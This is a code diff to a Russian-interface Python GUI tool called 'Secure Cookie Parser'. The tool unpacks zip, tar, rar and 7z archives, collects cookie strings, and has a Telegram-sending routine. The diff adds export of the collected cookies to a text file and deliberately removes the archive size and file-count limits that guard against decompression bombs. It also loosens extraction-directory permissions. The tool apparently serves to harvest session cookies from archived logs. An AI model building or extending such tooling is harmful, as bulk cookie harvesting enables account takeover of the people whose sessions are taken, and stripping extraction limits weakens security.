@@ -14,7 +14,7 @@ import shutil
 import zipfile
 import tarfile
 import rarfile
-import sevenzipfile
+import py7zr as sevenzipfile
 from pathlib import Path
 from datetime import datetime
 from typing import Optional, List, Tuple
@@ -43,14 +43,14 @@ class SecurityConfig:
         '.msi', '.dll', '.so', '.dylib', '.app', '.scr', '.pif'
     }
     
-    # Maximum file size to process (100MB)
-    MAX_FILE_SIZE = 100 * 1024 * 1024
+    # Maximum file size to process (unlimited - set to None for no limit)
+    MAX_FILE_SIZE = None  # No size limit
     
-    # Maximum extracted files
-    MAX_FILES = 1000
+    # Maximum extracted files (unlimited - set to None for no limit)
+    MAX_FILES = None  # No file count limit
     
     # Safe directory permissions (read-only for extracted files)
-    SAFE_DIR_PERMISSIONS = 0o555  # Read and execute only
+    SAFE_DIR_PERMISSIONS = 0o755  # Read and execute for all, write for owner
 
 
 class SecureTempDirectory:
@@ -123,10 +123,11 @@ class ArchiveHandler:
     @staticmethod
     def is_safe_file(filepath: str) -> bool:
         """Check if file is safe to process"""
-        # Check file size
+        # Check file size (only if limit is set)
         try:
-            if os.path.getsize(filepath) > SecurityConfig.MAX_FILE_SIZE:
-                return False
+            if SecurityConfig.MAX_FILE_SIZE is not None:
+                if os.path.getsize(filepath) > SecurityConfig.MAX_FILE_SIZE:
+                    return False
         except OSError:
             return False
             
@@ -163,7 +164,7 @@ class ArchiveHandler:
                     for member in zf.namelist():
                         if not cls.is_safe_filename(member):
                             continue
-                        if file_count >= SecurityConfig.MAX_FILES:
+                        if SecurityConfig.MAX_FILES is not None and file_count >= SecurityConfig.MAX_FILES:
                             break
                         try:
                             zf.extract(member, extract_to, pwd=password.encode() if password else None)
@@ -180,7 +181,7 @@ class ArchiveHandler:
                     for member in tf.getmembers():
                         if not cls.is_safe_filename(member.name):
                             continue
-                        if file_count >= SecurityConfig.MAX_FILES:
+                        if SecurityConfig.MAX_FILES is not None and file_count >= SecurityConfig.MAX_FILES:
                             break
                         try:
                             tf.extract(member, extract_to)
@@ -193,7 +194,7 @@ class ArchiveHandler:
                     for member in rf.namelist():
                         if not cls.is_safe_filename(member):
                             continue
-                        if file_count >= SecurityConfig.MAX_FILES:
+                        if SecurityConfig.MAX_FILES is not None and file_count >= SecurityConfig.MAX_FILES:
                             break
                         try:
                             rf.extract(member, extract_to, pwd=password)
@@ -206,7 +207,7 @@ class ArchiveHandler:
                     for member in szf.getnames():
                         if not cls.is_safe_filename(member):
                             continue
-                        if file_count >= SecurityConfig.MAX_FILES:
+                        if SecurityConfig.MAX_FILES is not None and file_count >= SecurityConfig.MAX_FILES:
                             break
                         try:
                             szf.extractall(extract_to, password=password)
@@ -276,9 +277,10 @@ class CookieParser:
     def _is_text_file(self, filepath: str) -> bool:
         """Check if file is likely a text file"""
         try:
-            # Check file size first
-            if os.path.getsize(filepath) > SecurityConfig.MAX_FILE_SIZE:
-                return False
+            # Check file size first (only if limit is set)
+            if SecurityConfig.MAX_FILE_SIZE is not None:
+                if os.path.getsize(filepath) > SecurityConfig.MAX_FILE_SIZE:
+                    return False
                 
             # Try to read first few bytes
             with open(filepath, 'rb') as f:
@@ -360,7 +362,7 @@ class ParserGUI:
     def __init__(self):
         self.root = tk.Tk()
         self.root.title("Secure Cookie Parser")
-        self.root.geometry("600x500")
+        self.root.geometry("600x550")
         self.root.resizable(False, False)
         
         # Variables
@@ -371,6 +373,7 @@ class ParserGUI:
         self.chat_id = tk.StringVar()
         self.status_var = tk.StringVar(value="Готов к работе")
         self.progress_var = tk.DoubleVar()
+        self.current_cookies = []  # Store cookies for export
         
         self.setup_ui()
         self.setup_styles()
@@ -482,7 +485,11 @@ class ParserGUI:
         
         # Start button
         self.start_btn = ttk.Button(main_frame, text="▶️ Начать", command=self.start_parsing)
-        self.start_btn.pack(fill=tk.X, pady=20)
+        self.start_btn.pack(fill=tk.X, pady=10)
+        
+        # Export button
+        self.export_btn = ttk.Button(main_frame, text="💾 Экспорт результатов", command=self.export_results, state=tk.DISABLED)
+        self.export_btn.pack(fill=tk.X, pady=(0, 20))
         
         # Progress section
         progress_frame = ttk.Frame(main_frame)
@@ -642,6 +649,13 @@ class ParserGUI:
         """Display results in text area"""
         self.results_text.delete(1.0, tk.END)
         
+        # Store cookies for export
+        self.current_cookies = cookies
+        
+        # Enable export button if we have cookies
+        if cookies:
+            self.root.after(0, lambda: self.export_btn.config(state=tk.NORMAL))
+        
         # Add formatted message
         self.results_text.insert(tk.END, message, 'header')
         
@@ -662,6 +676,42 @@ class ParserGUI:
         self.results_text.tag_config('cookie', foreground='#51cf66', font=('Consolas', 8))
         self.results_text.tag_config('separator', foreground='#666666')
         self.results_text.tag_config('info', foreground='#ffd43b', font=('Arial', 9, 'italic'))
+    
+    def export_results(self):
+        """Export results to file"""
+        if not self.current_cookies:
+            messagebox.showwarning("Экспорт", "Нет данных для экспорта!")
+            return
+        
+        # Ask for save location
+        filename = filedialog.asksaveasfilename(
+            title="Сохранить результаты",
+            defaultextension=".txt",
+            filetypes=[
+                ("Text files", "*.txt"),
+                ("All files", "*.*")
+            ],
+            initialfile=f"cookies_{int(time.time())}.txt"
+        )
+        
+        if not filename:
+            return
+        
+        try:
+            # Write cookies with warnings
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write(f"Cookie Export - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"Total cookies: {len(self.current_cookies)}\n")
+                f.write("=" * 60 + "\n\n")
+                
+                for cookie in self.current_cookies:
+                    f.write(cookie + "\n")
+            
+            messagebox.showinfo("Экспорт", f"Результаты успешно сохранены в:\n{filename}")
+            self.status_var.set(f"Экспортировано {len(self.current_cookies)} cookie")
+            
+        except Exception as e:
+            messagebox.showerror("Ошибка экспорта", f"Не удалось сохранить файл:\n{str(e)}")
     
     def send_to_telegram(self, cookies: List[str], message: str):
         """Send results to Telegram"""
@@ -704,9 +754,9 @@ def main():
         missing_libs.append('rarfile')
     
     try:
-        import sevenzipfile
+        import py7zr as sevenzipfile
     except ImportError:
-        missing_libs.append('sevenzipfile')
+        missing_libs.append('py7zr')
     
     if missing_libs:
         print("Missing libraries:", ', '.join(missing_libs))
